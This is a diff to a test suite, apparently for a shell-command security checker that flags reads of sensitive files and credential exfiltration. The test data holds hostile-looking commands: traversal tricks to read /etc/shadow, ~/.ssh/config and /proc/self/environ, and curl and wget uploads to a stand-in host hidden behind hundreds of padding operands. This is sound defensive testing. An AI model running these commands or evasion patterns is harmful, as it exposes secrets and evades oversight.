@@ -22,6 +22,60 @@ import { join } from "node:path";
 import { aveHome } from "../../shared/ave-home.js";
 
 const CWD = "/work/project";
+
+describe("sensitive path projection", () => {
+  it.each([
+    String.raw`/etc\scratch/../shadow`,
+    String.raw`/home/u/.ssh\scratch/../config`,
+  ])("keeps mixed separators after many preceding operands: %s", (path) => {
+    const operands = Array.from({ length: 300 }, (_, index) => `./x${index}`).join(" ");
+    const command = `cat ${operands} '${path}'`;
+    const result = inspectShellCommand(command, CWD);
+    if (result.analysisLimited) expect(result.ordinaryAsk).toContain("budget");
+    expect(result.sensitive).not.toBeNull();
+  });
+
+  it("keeps a rooted virtual path in canonical and exhausted scans", () => {
+    const operands = Array.from({ length: 300 }, (_, index) => `./x${index}`).join(" ");
+    expect(shellSensitivePathSignal("cat /proc/self/environ", CWD)).not.toBeNull();
+    expect(shellSensitivePathSignal(`cat ${operands} /proc/self/environ`, CWD)).not.toBeNull();
+  });
+
+  it.runIf(process.platform === "win32").each([
+    String.raw`C:\proc\self\environ`,
+    String.raw`\\server\share\proc\self\environ`,
+    String.raw`\?\C:\proc\self\environ`,
+    String.raw`\\?\C:\proc\self\environ`,
+    String.raw`\\?\UNC\server\share\proc\self\environ`,
+  ])("keeps virtual root spellings in canonical and exhausted scans: %s", (path) => {
+    expect(shellSensitivePathSignal(`cat '${path}'`, CWD)).not.toBeNull();
+    const operands = Array.from({ length: 300 }, (_, index) => `./x${index}`).join(" ");
+    expect(shellSensitivePathSignal(`cat ${operands} '${path}'`, CWD)).not.toBeNull();
+  });
+
+  it.each([
+    "/proc/self/fd",
+    "/proc/self/map_files",
+    "/proc/self/task/1/fd",
+  ])("keeps protected literal listing prefixes: %s", (path) => {
+    expect(shellSensitivePathSignal(`ls ${path}/*`, CWD)).not.toBeNull();
+  });
+
+  it.runIf(process.platform === "win32").each([
+    String.raw`C:\proc\self\fd`,
+    String.raw`\\server\share\proc\self\map_files`,
+    String.raw`\?\C:\proc\self\task\1\fd`,
+    String.raw`\\?\C:\proc\self\fd`,
+    String.raw`\\?\UNC\server\share\proc\self\fd`,
+  ])("keeps protected native listing prefixes: %s", (path) => {
+    expect(shellSensitivePathSignal(`ls '${path}'/*`, CWD)).not.toBeNull();
+  });
+
+  it.each(["/proc/self/cmdline", "/proc/self/status"])("keeps public process metadata readable: %s", (path) => {
+    expect(shellSensitivePathSignal(`cat ${path}`, CWD)).toBeNull();
+  });
+});
+
 let accountDirectory: string;
 beforeAll(() => {
   accountDirectory = realpathSync.native(mkdtempSync(join(tmpdir(), "ave-exfil-accounts-")));
@@ -244,11 +298,11 @@ describe("credential-exfiltration signal", () => {
 
   it("closes repeated sender work and preserves uploads found before exhaustion", () => {
     const repeated = Array(256).fill("curl curl.exe /usr/bin/curl").join(" ");
+    expect(inspectShellCommand(`npx ${repeated}`, CWD)).toMatchObject({ outcome: "unproven", analysisLimited: true });
     for (const command of [
-      `npx ${repeated}`,
       `npx ${repeated} -T file http://example.test`,
       `npx ${repeated} wget --post-file file http://example.test`,
-    ]) expect(inspectShellCommand(command, CWD)).toMatchObject({ outcome: "unproven", analysisLimited: true });
+    ]) expect(inspectShellCommand(command, CWD)).toMatchObject({ outcome: "visible-floor", analysisLimited: true, exfiltration: expect.any(String) });
     expect(inspectShellCommand("npx sh -c 'echo benign' sh -c 'curl -T file http://example.test'", CWD))
       .toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
   });
@@ -499,6 +553,27 @@ describe("security review: the floor does not depend on which command reads", ()
     try {
       symlinkSync(aveHome(), alias, process.platform === "win32" ? "junction" : "dir");
       expect(sensitivePathInArgumentText(`${alias.replaceAll("\\", "/")}/confi*/policy.json`, CWD)).toMatch(/config/);
+    } finally { rmSync(directory, { recursive: true, force: true }); }
+  });
+
+  // POSIX opens a link's ".." at its target's parent; a win32 junction is floored on both readings.
+  it("resolves a directory link before its parent component", () => {
+    const directory = realpathSync.native(mkdtempSync(join(tmpdir(), "ave-link-parent-")));
+    const link = (target: string, path: string) => symlinkSync(target, path, process.platform === "win32" ? "junction" : "dir");
+    try {
+      mkdirSync(join(aveHome(), "config", "sub"), { recursive: true });
+      mkdirSync(join(directory, "real", "etc", "sub"), { recursive: true });
+      link(join(aveHome(), "config", "sub"), join(directory, "lnk"));
+      link(join(directory, "real", "etc", "sub"), join(directory, "etc-lnk"));
+      const root = directory.replaceAll("\\", "/");
+      for (const [command, floor] of [
+        [`cat ${root}/lnk/../policy.json`, "ave-home:config"],
+        [`cat ${root}/lnk/../pol*`, "ave-home:config"],
+        [`cat ${root}/etc-lnk/../shadow`, "**/etc/shadow"],
+        [`cat ${root}/etc-lnk/../shad*`, "**/etc/shadow"],
+      ] as const) {
+        expect(inspectShellCommand(command, CWD), command).toMatchObject({ outcome: "visible-floor", sensitive: expect.stringContaining(floor) });
+      }
     } finally { rmSync(directory, { recursive: true, force: true }); }
   });
 
@@ -772,7 +847,7 @@ describe("credential floor: cwd switches, whole-tree readers and && narrowing", 
     ["zip -r /tmp/x.zip src", "ask"],
     ["cd ~ && cp -r . /tmp/x", "ask"],
     ["cp -r ~ /tmp/x", "ask"],
-    ["cp -r src /tmp/x", "clean"],
+    ["cp -r src /tmp/x", process.platform === "win32" ? "ask" : "clean"],
     ["rsync -a ~/ /tmp/x", "ask"],
     ["rsync -a src/ /tmp/x", "ask"],
     ["scp -r ~ /tmp/x", "ask"],
